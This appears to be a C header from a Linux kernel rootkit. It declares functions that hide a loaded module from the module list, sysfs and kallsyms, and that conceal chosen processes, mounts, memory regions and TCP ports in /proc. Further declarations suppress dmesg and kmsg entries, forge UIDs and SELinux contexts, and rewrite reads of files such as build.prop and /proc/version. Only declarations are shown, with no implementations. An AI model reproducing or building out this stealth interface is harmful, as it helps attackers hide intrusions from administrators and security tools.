/* SPDX-License-Identifier: GPL-2.0 */
#ifndef NEVERC_KRT_VIS_H
#define NEVERC_KRT_VIS_H

#include <linux/types.h>
#include <linux/compiler.h>
#include <linux/list.h>

struct neverc_krt_this_module;

#include <nvk_interpose.h>

typedef void *(*neverc_krt_find_module_fn)(const char *name);

struct neverc_krt_vis_state {
	struct list_head *saved_next;
	struct list_head *saved_prev;
	int               filtered;
	struct neverc_krt_interpose   find_module_interpose;
	neverc_krt_find_module_fn orig_find_module;
	const char       *module_name;
	int               sysfs_removed;
	int               kallsyms_filtered;
	void             *saved_kobj;
	struct neverc_krt_interpose   seq_show_interpose;
	int               seq_show_interposed;
};

#define NEVERC_KRT_VIS_INIT_STATE { .saved_next = 0, .saved_prev = 0,  \
			      .filtered = 0, .module_name = 0,     \
			      .sysfs_removed = 0,                 \
			      .kallsyms_filtered = 0,             \
			      .saved_kobj = 0,                    \
			      .seq_show_interposed = 0 }

int neverc_krt_vis_init(void);

void neverc_krt_vis_filter(struct neverc_krt_vis_state *state,
			 struct neverc_krt_this_module *mod);

void neverc_krt_vis_restore(struct neverc_krt_vis_state *state,
			 struct neverc_krt_this_module *mod);

int neverc_krt_vis_is_filtered(const struct neverc_krt_vis_state *state);

void neverc_krt_vis_sysfs_remove(struct neverc_krt_vis_state *state,
				 struct neverc_krt_this_module *mod);

int neverc_krt_vis_proc_filter(struct neverc_krt_vis_state *state,
			       const char *module_name);

int neverc_krt_vis_kallsyms_filter(struct neverc_krt_vis_state *state,
				   const char *module_name);

void neverc_krt_vis_filter_full(struct neverc_krt_vis_state *state,
			      struct neverc_krt_this_module *mod,
			      const char *module_name);

/* --- /proc/pid filtering --- */

int neverc_krt_vis_pid_add(int pid);
int neverc_krt_vis_pid_remove(int pid);
int neverc_krt_vis_pid_install(void);
int neverc_krt_vis_pid_check(int pid);
void neverc_krt_vis_pid_cleanup(void);

/* --- /proc/mounts path filter --- */

#define NEVERC_KRT_VIS_MOUNT_FILTER_MAX 8
#define NEVERC_KRT_VIS_MOUNT_PATH_MAX   64

int neverc_krt_vis_mount_filter_add(const char *path);
int neverc_krt_vis_mount_filter_install(void);
void neverc_krt_vis_mount_filter_cleanup(void);

/* --- /proc/pid/maps module region filter --- */

#define NEVERC_KRT_VIS_MAPS_FILTER_MAX 4

int neverc_krt_vis_maps_filter_add(unsigned long start, unsigned long end);
int neverc_krt_vis_maps_should_filter(unsigned long addr);
void neverc_krt_vis_maps_filter_clear(void);
void neverc_krt_vis_maps_filter_add_self(void);

void neverc_krt_vis_wipe_modinfo(struct neverc_krt_this_module *mod);

void neverc_krt_vis_pause_interposes(void);
void neverc_krt_vis_remove_interposes(void);

/* --- /proc/vmallocinfo filter --- */

int neverc_krt_vis_vmalloc_filter(void);

/* --- dmesg / kmsg log suppression --- */

#define NEVERC_KRT_VIS_DMESG_FILTER_MAX 4
#define NEVERC_KRT_VIS_DMESG_FILTER_LEN 32

int neverc_krt_vis_dmesg_filter_add(const char *keyword);
int neverc_krt_vis_dmesg_suppress_install(const char *module_name);
void neverc_krt_vis_dmesg_suppress_cleanup(void);

int neverc_krt_vis_kmsg_read_filter_install(void);
void neverc_krt_vis_kmsg_read_filter_cleanup(void);

/* --- /proc/pid/status UID rewrite --- */

int neverc_krt_vis_proc_status_filter_install(u32 rewrite_uid, u32 rewrite_gid);
void neverc_krt_vis_proc_status_filter_cleanup(void);

/* --- /proc/pid/attr SELinux context filter --- */

int neverc_krt_vis_proc_attr_filter_install(const char *rewrite_context);
void neverc_krt_vis_proc_attr_filter_cleanup(void);

/* --- /proc/net/tcp{,6} port filtering --- */

#define NEVERC_KRT_VIS_NET_PORT_MAX 16

int neverc_krt_vis_net_add_port(u16 port);
int neverc_krt_vis_net_install(void);
void neverc_krt_vis_net_cleanup(void);

/* --- /proc/pid/cmdline content filter --- */

#define NEVERC_KRT_VIS_CMDLINE_FILTER_MAX 4
#define NEVERC_KRT_VIS_CMDLINE_FILTER_LEN 32

int neverc_krt_vis_cmdline_filter_add(const char *keyword);
int neverc_krt_vis_cmdline_filter_install(void);
void neverc_krt_vis_cmdline_filter_cleanup(void);

/* --- File read interception (build.prop, /proc/version rewrite) --- */

#define NEVERC_KRT_VIS_FILE_REWRITE_MAX 4
#define NEVERC_KRT_VIS_FILE_PATH_MAX  64
#define NEVERC_KRT_VIS_FILE_REWRITE_MAX_LEN 128

int neverc_krt_vis_file_rewrite_add(const char *path,
			      const char *search, int slen,
			      const char *replace, int rlen);

int neverc_krt_vis_file_rewrite_install(void);
void neverc_krt_vis_file_rewrite_cleanup(void);

#endif /* NEVERC_KRT_VIS_H */
